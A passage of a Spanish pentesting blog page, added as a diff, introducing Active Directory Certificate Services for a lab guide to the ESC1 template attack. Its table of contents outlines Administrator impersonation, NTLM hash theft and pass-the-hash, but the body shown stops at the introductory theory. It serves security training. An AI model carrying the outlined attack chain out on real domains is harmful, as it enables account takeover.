@@ -1,0 +1,1830 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../configuracion-ad-basico/">
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/lucifer.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Abuso de AD CS (ESC1) - Bitácora de javik</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../estilos/gruvbox.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#abuso-de-ad-cs-explotacion-de-plantillas-esc1" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../.." title="Bitácora de javik" class="md-header__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../assets/lucifer.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Bitácora de javik
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Abuso de AD CS (ESC1)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Bitácora de javik" class="md-nav__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../assets/lucifer.png" alt="logo">
+
+    </a>
+    Bitácora de javik
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎯 Bitácora de javik
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../maquinas/htb/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💀 Máquinas HTB
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💀 Máquinas HTB
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/administrator/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Administrator
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/babytwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BabyTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/delegate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Delegate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/tombwatcher/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TombWatcher
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/escapetwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    EscapeTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/breach/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Breach
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/media/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Media
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/authority/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authority
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../herramientas/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛠️ Herramientas
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🛠️ Herramientas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../herramientas/nxc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NetExec (NXC)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../herramientas/sliver-c2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sliver C2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../herramientas/seimpersonate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SeImpersonatePrivilege
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../herramientas/mssql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enumeración MSSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../herramientas/chisel-pivoting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chisel & Pivoting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../certificaciones/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏆 Certificaciones
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mis Notas
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Mis Notas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../configuracion-ad-basico/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuración de AD Básico
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Abuso de AD CS (ESC1)
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Abuso de AD CS (ESC1)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#que-es-ad-cs-active-directory-certificate-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ¿Qué es AD CS (Active Directory Certificate Services)?
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="¿Qué es AD CS (Active Directory Certificate Services)?">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#usos-en-entornos-reales" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Usos en Entornos Reales
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#componentes-clave-del-sistema" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Componentes Clave del Sistema
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#por-que-ad-cs-es-un-objetivo-critico-en-auditorias-ofensivas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ¿Por qué AD CS es un objetivo crítico en auditorías ofensivas?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-instalacion-y-configuracion-de-ad-cs-en-windows-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Instalación y Configuración de AD CS en Windows Server
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Instalación y Configuración de AD CS en Windows Server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#configuracion-post-instalacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuración Post-Instalación
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-creacion-de-la-plantilla-vulnerable-a-esc1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Creación de la Plantilla Vulnerable a ESC1
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Creación de la Plantilla Vulnerable a ESC1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#el-factor-vulnerable-subject-name" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        El Factor Vulnerable: Subject Name
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#permisos-de-inscripcion-enrollment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Permisos de Inscripción (Enrollment)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#publicacion-de-la-plantilla-en-la-ca" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Publicación de la Plantilla en la CA
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-enumeracion-y-explotacion-desde-linux-con-certipy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Enumeración y Explotación desde Linux con Certipy
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Enumeración y Explotación desde Linux con Certipy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeracion-de-plantillas-vulnerables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeración de Plantillas Vulnerables
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solicitud-de-certificado-suplantando-a-administrator" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Solicitud de Certificado Suplantando a Administrator
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#autenticacion-via-pkinit-y-obtencion-del-hash-ntlm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Autenticación vía PKINIT y Obtención del Hash NTLM
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#acceso-total-con-pass-the-hash-evil-winrm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Acceso Total con Pass-the-Hash (Evil-WinRM)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analisis-tecnico-que-ocurrio" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Análisis Técnico: ¿Qué Ocurrió?
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Análisis Técnico: ¿Qué Ocurrió?">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#que-es-pkinit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ¿Qué es PKINIT?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#la-causa-raiz-de-esc1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        La Causa Raíz de ESC1
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#medidas-de-mitigacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Medidas de Mitigación
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recursos-adicionales" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Recursos Adicionales
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#que-es-ad-cs-active-directory-certificate-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ¿Qué es AD CS (Active Directory Certificate Services)?
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="¿Qué es AD CS (Active Directory Certificate Services)?">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#usos-en-entornos-reales" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Usos en Entornos Reales
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#componentes-clave-del-sistema" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Componentes Clave del Sistema
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#por-que-ad-cs-es-un-objetivo-critico-en-auditorias-ofensivas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ¿Por qué AD CS es un objetivo crítico en auditorías ofensivas?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-instalacion-y-configuracion-de-ad-cs-en-windows-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Instalación y Configuración de AD CS en Windows Server
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Instalación y Configuración de AD CS en Windows Server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#configuracion-post-instalacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuración Post-Instalación
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-creacion-de-la-plantilla-vulnerable-a-esc1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Creación de la Plantilla Vulnerable a ESC1
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Creación de la Plantilla Vulnerable a ESC1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#el-factor-vulnerable-subject-name" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        El Factor Vulnerable: Subject Name
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#permisos-de-inscripcion-enrollment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Permisos de Inscripción (Enrollment)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#publicacion-de-la-plantilla-en-la-ca" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Publicación de la Plantilla en la CA
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-enumeracion-y-explotacion-desde-linux-con-certipy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Enumeración y Explotación desde Linux con Certipy
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Enumeración y Explotación desde Linux con Certipy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeracion-de-plantillas-vulnerables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeración de Plantillas Vulnerables
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solicitud-de-certificado-suplantando-a-administrator" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Solicitud de Certificado Suplantando a Administrator
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#autenticacion-via-pkinit-y-obtencion-del-hash-ntlm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Autenticación vía PKINIT y Obtención del Hash NTLM
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#acceso-total-con-pass-the-hash-evil-winrm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Acceso Total con Pass-the-Hash (Evil-WinRM)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analisis-tecnico-que-ocurrio" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Análisis Técnico: ¿Qué Ocurrió?
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Análisis Técnico: ¿Qué Ocurrió?">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#que-es-pkinit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ¿Qué es PKINIT?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#la-causa-raiz-de-esc1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        La Causa Raíz de ESC1
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#medidas-de-mitigacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Medidas de Mitigación
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recursos-adicionales" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Recursos Adicionales
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="abuso-de-ad-cs-explotacion-de-plantillas-esc1">Abuso de AD CS: Explotación de Plantillas ESC1<a class="headerlink" href="#abuso-de-ad-cs-explotacion-de-plantillas-esc1" title="Permanent link">&para;</a></h1>
+<p>Guía detallada sobre el abuso de <strong>Active Directory Certificate Services (AD CS)</strong> centrada en el vector <strong>ESC1</strong>: fundamentos teóricos, configuración paso a paso de un laboratorio vulnerable en Windows Server, enumeración y explotación con Certipy desde Linux, y medidas de mitigación.</p>
+<hr />
+<h2 id="que-es-ad-cs-active-directory-certificate-services">¿Qué es AD CS (Active Directory Certificate Services)?<a class="headerlink" href="#que-es-ad-cs-active-directory-certificate-services" title="Permanent link">&para;</a></h2>
+<p><strong>AD CS</strong> es el rol de Windows Server que convierte un entorno de Active Directory en una <strong>Infraestructura de Clave Pública (PKI)</strong> corporativa. En lugar de adquirir certificados a entidades externas (como DigiCert o Let's Encrypt), la propia organización actúa como su propia Autoridad Certificadora (CA) y emite certificados digitales para sus usuarios, equipos y servicios.</p>
+<h3 id="usos-en-entornos-reales">Usos en Entornos Reales<a class="headerlink" href="#usos-en-entornos-reales" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Autenticación</strong>: Inicio de sesión mediante Smart Cards o certificados en equipos clientes sin necesidad de introducir contraseñas.</li>
+<li><strong>Cifrado de correo (S/MIME)</strong>: Firma y cifrado de mensajes internos.</li>
+<li><strong>HTTPS interno</strong>: Certificados SSL/TLS para intranets y servicios corporativos.</li>
+<li><strong>VPN y Wi-Fi empresarial (802.1x)</strong>: Validación de acceso de dispositivos corporativos.</li>
+<li><strong>Firma de código</strong>: Firma digital de binarios y scripts internos.</li>
+<li><strong>IPSec</strong>: Cifrado del tráfico entre servidores.</li>
+</ul>
+<hr />
+<h3 id="componentes-clave-del-sistema">Componentes Clave del Sistema<a class="headerlink" href="#componentes-clave-del-sistema" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>La Autoridad de Certificación (CA - Certificate Authority)</strong>:<br />
+   Actúa como la entidad de confianza del dominio. Puede ser:</li>
+<li><strong>Enterprise CA</strong>: Integrada con Active Directory. Publica plantillas y certificados en el directorio y permite el enrolamiento automático.</li>
+<li><strong>Standalone CA</strong>: Independiente de Active Directory, orientada a entornos aislados.</li>
+<li>
+<p>Jerárquicamente se divide en <strong>Root CA</strong> (raíz) y <strong>Subordinate / Issuing CAs</strong> (emisoras).</p>
+</li>
+<li>
+<p><strong>Plantillas de Certificado (Certificate Templates)</strong>:<br />
+   Definen las directivas de emisión de un certificado:</p>
+</li>
+<li>Quién tiene permiso para solicitarlo (<em>Enrollment Rights</em>).</li>
+<li>El propósito de uso definido por el <strong>EKU</strong> (<em>Extended Key Usage</em>), como <em>Client Authentication</em>, <em>Server Authentication</em> o <em>Code Signing</em>.</li>
+<li>El período de validez y renovación.</li>
+<li>Si requiere aprobación manual de un administrador.</li>
+<li>
+<p><strong>Quién define el Subject (identidad) del certificado</strong>.</p>
+</li>
+<li>
